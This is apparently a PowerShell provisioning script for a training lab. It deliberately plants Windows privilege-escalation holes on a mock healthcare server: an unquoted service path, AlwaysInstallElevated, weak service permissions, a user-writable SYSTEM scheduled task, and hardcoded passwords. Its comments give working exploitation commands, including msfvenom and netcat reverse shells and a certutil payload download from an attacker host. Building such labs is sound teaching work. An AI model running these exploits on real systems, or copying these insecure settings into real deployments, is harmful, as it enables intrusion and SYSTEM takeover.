<#
.SYNOPSIS
    Plants all privilege escalation vectors on MedAlliance-WIN Tier 1.

.NOTES
    Vectors planted (all discoverable by WinPEAS/PowerUp/Seatbelt/manual enum):

    W-PRIV-01  Unquoted service path       — MedAlliance Health Monitor agent
    W-PRIV-02  AlwaysInstallElevated        — registry keys in HKLM + HKCU
    W-PRIV-03  SeImpersonatePrivilege       — via MSSQL xp_cmdshell service account
    W-PRIV-04  Stored credentials (cmdkey)  — planted in Configure-Users.ps1
    W-PRIV-05  Weak service permissions     — MedHealthSvc modifiable by m.chen
    W-PRIV-06  Writable scheduled task      — daily_report.bat runs as SYSTEM
#>

$ErrorActionPreference = "Continue"

function Write-Phase {
    param([string]$Msg)
    Write-Host "[$(Get-Date -Format 'HH:mm:ss')][Vulns] $Msg"
}

# ═══════════════════════════════════════════════════════════════
#  W-PRIV-01: UNQUOTED SERVICE PATH
# ═══════════════════════════════════════════════════════════════
#
# The service binary path contains spaces and is NOT quoted:
#   C:\Program Files\MedAlliance\Health Monitor\agent.exe
#
# Windows will try these in order:
#   C:\Program.exe
#   C:\Program Files\MedAlliance.exe      ← m.chen can write here
#   C:\Program Files\MedAlliance\Health.exe
#   C:\Program Files\MedAlliance\Health Monitor\agent.exe
#
# If m.chen places a malicious "MedAlliance.exe" in C:\Program Files\,
# it runs as the service account (or SYSTEM) on next service restart.

Write-Phase "W-PRIV-01: Creating unquoted service path..."

# Create the nested directory (spaces in path = vulnerable)
$svcDir = "C:\Program Files\MedAlliance\Health Monitor"
New-Item -Path $svcDir -ItemType Directory -Force | Out-Null

# Create a benign agent.exe (just a script that does nothing harmful)
# We compile a tiny C# program that loops and writes to a log
$agentSource = @"
using System;
using System.IO;
using System.ServiceProcess;
using System.Threading;

public class MedHealthAgent : ServiceBase {
    private Timer _timer;
    public MedHealthAgent() { ServiceName = "MedHealthSvc"; }
    protected override void OnStart(string[] args) {
        _timer = new Timer(DoWork, null, 0, 60000);
    }
    protected override void OnStop() { _timer?.Dispose(); }
    private void DoWork(object state) {
        try {
            string logPath = @"C:\Program Files\MedAlliance\Health Monitor\agent.log";
            File.AppendAllText(logPath,
                DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " Health check OK\r\n");
        } catch { }
    }
    public static void Main() { Run(new MedHealthAgent()); }
}
"@

# Compile the service executable
try {
    $cscPath = Join-Path ([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()) "csc.exe"
    if (-not (Test-Path $cscPath)) {
        # Fallback: find any available csc.exe
        $cscPath = (Get-ChildItem "C:\Windows\Microsoft.NET\Framework64" -Recurse -Filter "csc.exe" |
                    Sort-Object FullName -Descending | Select-Object -First 1).FullName
    }

    $sourceFile = "$svcDir\agent.cs"
    Set-Content -Path $sourceFile -Value $agentSource -Encoding UTF8

    & $cscPath /target:exe /out:"$svcDir\agent.exe" /reference:System.ServiceProcess.dll $sourceFile 2>&1 | Out-Null

    if (Test-Path "$svcDir\agent.exe") {
        Write-Phase "  Compiled agent.exe successfully."
        Remove-Item $sourceFile -Force -ErrorAction SilentlyContinue
    } else {
        # Fallback: create a simple batch-based "service" that sc.exe can manage
        Write-Phase "  CSC compilation failed, using batch-based fallback."
        @"
@echo off
:loop
echo %date% %time% Health check OK >> "%~dp0agent.log"
timeout /t 60 /nobreak >nul
goto loop
"@ | Set-Content -Path "$svcDir\agent.bat" -Encoding ASCII
    }
} catch {
    Write-Phase "  WARNING: Could not compile agent.exe — $($_.Exception.Message)"
}

# Create the service with an UNQUOTED path (the vulnerability)
# Note: sc.exe create does NOT auto-quote paths with spaces
sc.exe create MedHealthSvc `
    binPath= "C:\Program Files\MedAlliance\Health Monitor\agent.exe" `
    start= auto `
    obj= ".\MedHealthSvc" `
    password= "H3althM0n!tor2024" `
    DisplayName= "MedAlliance Health Monitor" 2>&1 | Out-Null

sc.exe description MedHealthSvc "MedAlliance Health Partners system health monitoring agent" 2>&1 | Out-Null

# Verify the path is unquoted (this is the vulnerable condition)
$svcRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\MedHealthSvc"
if (Test-Path $svcRegPath) {
    $imagePath = (Get-ItemProperty $svcRegPath).ImagePath
    Write-Phase "  Service ImagePath: $imagePath"
    if ($imagePath -notmatch '^"') {
        Write-Phase "  CONFIRMED: Path is unquoted (vulnerable)."
    }
}

# Grant m.chen write access to C:\Program Files\MedAlliance\
# (so they can place MedAlliance.exe — the exploit)
$parentDir = "C:\Program Files\MedAlliance"
$acl = Get-Acl $parentDir
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "m.chen", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl $parentDir $acl
Write-Phase "  m.chen has Modify access to $parentDir"

# Start the service
Start-Service MedHealthSvc -ErrorAction SilentlyContinue

Write-Phase "W-PRIV-01 planted: Unquoted service path for MedHealthSvc."

# ═══════════════════════════════════════════════════════════════
#  W-PRIV-02: ALWAYSINSTALLELEVATED
# ═══════════════════════════════════════════════════════════════
#
# When both HKLM and HKCU have AlwaysInstallElevated = 1,
# any user can install .msi files as NT AUTHORITY\SYSTEM.
#
# Exploitation:
#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=5555 -f msi -o evil.msi
#   msiexec /quiet /qn /i evil.msi

Write-Phase "W-PRIV-02: Setting AlwaysInstallElevated..."

# HKLM key
$hklmPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
if (-not (Test-Path $hklmPath)) { New-Item -Path $hklmPath -Force | Out-Null }
Set-ItemProperty -Path $hklmPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord

# HKCU key — needs to be in m.chen's registry hive
# Load m.chen's NTUSER.DAT if profile exists, otherwise set in Default User
$mchenNtuser = "C:\Users\m.chen\NTUSER.DAT"
$tempHive = "HKLM:\TEMP_MCHEN"

if (Test-Path $mchenNtuser) {
    reg load "HKLM\TEMP_MCHEN" $mchenNtuser 2>&1 | Out-Null
    $hkcuPath = "HKLM:\TEMP_MCHEN\SOFTWARE\Policies\Microsoft\Windows\Installer"
    if (-not (Test-Path $hkcuPath)) { New-Item -Path $hkcuPath -Force | Out-Null }
    Set-ItemProperty -Path $hkcuPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord
    [gc]::Collect()
    reg unload "HKLM\TEMP_MCHEN" 2>&1 | Out-Null
    Write-Phase "  Set in m.chen's HKCU hive."
} else {
    # Set in Default User profile (will apply to any new login)
    $defaultNtuser = "C:\Users\Default\NTUSER.DAT"
    if (Test-Path $defaultNtuser) {
        reg load "HKLM\TEMP_DEFAULT" $defaultNtuser 2>&1 | Out-Null
        $defPath = "HKLM:\TEMP_DEFAULT\SOFTWARE\Policies\Microsoft\Windows\Installer"
        if (-not (Test-Path $defPath)) { New-Item -Path $defPath -Force | Out-Null }
        Set-ItemProperty -Path $defPath -Name "AlwaysInstallElevated" -Value 1 -Type DWord
        [gc]::Collect()
        reg unload "HKLM\TEMP_DEFAULT" 2>&1 | Out-Null
        Write-Phase "  Set in Default User hive (applies on first login)."
    }

    # Also set in current user context (SYSTEM during deployment)
    $hkcuCurrent = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    if (-not (Test-Path $hkcuCurrent)) { New-Item -Path $hkcuCurrent -Force | Out-Null }
    Set-ItemProperty -Path $hkcuCurrent -Name "AlwaysInstallElevated" -Value 1 -Type DWord
}

Write-Phase "W-PRIV-02 planted: AlwaysInstallElevated in HKLM + HKCU."

# ═══════════════════════════════════════════════════════════════
#  W-PRIV-03: SeImpersonatePrivilege (via MSSQL service)
# ═══════════════════════════════════════════════════════════════
#
# The SQL Server service runs as a local service account that has
# SeImpersonatePrivilege. When students get a shell via xp_cmdshell,
# they inherit this privilege and can use PrintSpoofer/GodPotato
# to escalate to SYSTEM.
#
# This is inherent to SQL Server's service account — no config needed.
# Students discover it via: whoami /priv (after xp_cmdshell shell)
#
# Exploitation:
#   1. Connect: impacket-mssqlclient sa:'SQLAdmin2024!'@TARGET
#   2. Shell:   EXEC xp_cmdshell 'whoami /priv'
#   3. See SeImpersonatePrivilege
#   4. Upload PrintSpoofer: EXEC xp_cmdshell 'certutil -urlcache -f http://KALI/PrintSpoofer64.exe C:\Temp\ps.exe'
#   5. Escalate: EXEC xp_cmdshell 'C:\Temp\ps.exe -c "C:\Temp\nc.exe KALI 5555 -e cmd.exe"'

Write-Phase "W-PRIV-03: SeImpersonatePrivilege is inherent to SQL service — no action needed."
Write-Phase "  Students discover via xp_cmdshell → whoami /priv."

# Create C:\Temp with write permissions for Everyone (exploit staging area)
$tempDir = "C:\Temp"
New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
$acl = Get-Acl $tempDir
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl $tempDir $acl
Write-Phase "  C:\Temp created with Everyone:FullControl (exploit staging)."

# ═══════════════════════════════════════════════════════════════
#  W-PRIV-05: WEAK SERVICE PERMISSIONS
# ═══════════════════════════════════════════════════════════════
#
# m.chen can modify the MedHealthSvc service configuration.
# This means they can change the binary path to a reverse shell.
#
# Discovery:
#   accesschk.exe /accepteula -uwcqv m.chen MedHealthSvc
#   → SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP
#
# Exploitation:
#   sc.exe config MedHealthSvc binPath= "C:\Temp\revshell.exe"
#   sc.exe stop MedHealthSvc
#   sc.exe start MedHealthSvc

Write-Phase "W-PRIV-05: Setting weak service permissions on MedHealthSvc..."

# Grant m.chen SERVICE_ALL_ACCESS on the MedHealthSvc service
# Using sc.exe sdset with a custom DACL
# The DACL grants: Administrators full, SYSTEM full, m.chen full service control
$mchenSid = (New-Object System.Security.Principal.NTAccount("m.chen")).Translate(
    [System.Security.Principal.SecurityIdentifier]).Value

# Build SDDL: D = DACL, A = Allow
# CC = SERVICE_QUERY_CONFIG, LC = SERVICE_QUERY_STATUS, SW = SERVICE_ENUMERATE_DEPENDENTS
# RP = SERVICE_START, WP = SERVICE_STOP, DC = SERVICE_CHANGE_CONFIG
# GA = GENERIC_ALL (for Administrators and SYSTEM)
$sddl = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;RPWPCCDCLCSWSDRCWDWO;;;${mchenSid})"

sc.exe sdset MedHealthSvc $sddl 2>&1 | Out-Null
Write-Phase "  m.chen has full service control on MedHealthSvc."

Write-Phase "W-PRIV-05 planted: Weak service permissions."

# ═══════════════════════════════════════════════════════════════
#  W-PRIV-06: WRITABLE SCHEDULED TASK
# ═══════════════════════════════════════════════════════════════
#
# A scheduled task runs C:\Scripts\daily_report.bat as SYSTEM every 15 min.
# m.chen (and all Users) can write to this file.
#
# Discovery:
#   schtasks /query /fo LIST /v | findstr /i "daily_report"
#   icacls C:\Scripts\daily_report.bat
#   → Shows BUILTIN\Users:(M) or m.chen has modify
#
# Exploitation:
#   echo C:\Temp\nc.exe KALI 6666 -e cmd.exe >> C:\Scripts\daily_report.bat
#   (wait up to 15 minutes for execution as SYSTEM)

Write-Phase "W-PRIV-06: Creating writable scheduled task..."

$scriptsDir = "C:\Scripts"
New-Item -Path $scriptsDir -ItemType Directory -Force | Out-Null

# Create the "legitimate" script
@"
@echo off
REM MedAlliance Daily Report Generator
REM Runs every 15 minutes as SYSTEM
REM Generates system health metrics for the Health Monitor dashboard

echo [%date% %time%] Generating daily report... >> C:\Scripts\report.log
systeminfo >> C:\Scripts\report.log 2>&1
echo [%date% %time%] Report generation complete. >> C:\Scripts\report.log
"@ | Set-Content "$scriptsDir\daily_report.bat" -Encoding ASCII

# Create the backup script (not vulnerable — just for realism)
@"
@echo off
REM MedAlliance Database Backup Script
REM Runs daily at 02:00 as SYSTEM

echo [%date% %time%] Starting SQL backup... >> C:\Scripts\backup.log
sqlcmd -S .\SQLEXPRESS -E -Q "BACKUP DATABASE hr_database TO DISK = 'C:\Backups\hr_database.bak' WITH INIT" >> C:\Scripts\backup.log 2>&1
echo [%date% %time%] Backup complete. >> C:\Scripts\backup.log
"@ | Set-Content "$scriptsDir\backup_databases.bat" -Encoding ASCII

# Create Backups directory
New-Item -Path "C:\Backups" -ItemType Directory -Force | Out-Null

# Grant BUILTIN\Users Modify access to daily_report.bat (the vulnerability)
$acl = Get-Acl "$scriptsDir\daily_report.bat"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "BUILTIN\Users", "Modify", "None", "None", "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl "$scriptsDir\daily_report.bat" $acl

# Register the scheduled task to run every 15 minutes as SYSTEM
$action   = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Scripts\daily_report.bat"
$trigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 15) `
                -RepetitionDuration (New-TimeSpan -Days 365) -At "00:00"
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -RunLevel Highest -LogonType ServiceAccount
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                -StartWhenAvailable -MultipleInstances IgnoreNew

Register-ScheduledTask -TaskName "DailyReportGenerator" `
    -Action $action -Trigger $trigger -Principal $principal -Settings $settings `
    -Description "Generates daily system health report for monitoring dashboard" `
    -Force

# Also register the backup task (not vulnerable — for realism)
$bkAction  = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Scripts\backup_databases.bat"
$bkTrigger = New-ScheduledTaskTrigger -Daily -At "02:00"

Register-ScheduledTask -TaskName "NightlyDatabaseBackup" `
    -Action $bkAction -Trigger $bkTrigger -Principal $principal -Settings $settings `
    -Description "Nightly backup of SQL Server databases" `
    -Force

Write-Phase "W-PRIV-06 planted: daily_report.bat writable by Users, runs as SYSTEM every 15 min."

# ═══════════════════════════════════════════════════════════════
#  SUMMARY
# ═══════════════════════════════════════════════════════════════
Write-Phase ""
Write-Phase "=== Privilege Escalation Vectors Planted ==="
Write-Phase "  W-PRIV-01: Unquoted service path (MedHealthSvc)"
Write-Phase "  W-PRIV-02: AlwaysInstallElevated (HKLM + HKCU)"
Write-Phase "  W-PRIV-03: SeImpersonatePrivilege (inherent, MSSQL xp_cmdshell)"
Write-Phase "  W-PRIV-04: Stored credentials (cmdkey — set in Configure-Users.ps1)"
Write-Phase "  W-PRIV-05: Weak service perms (m.chen → MedHealthSvc)"
Write-Phase "  W-PRIV-06: Writable scheduled task (daily_report.bat → SYSTEM)"
Write-Phase ""
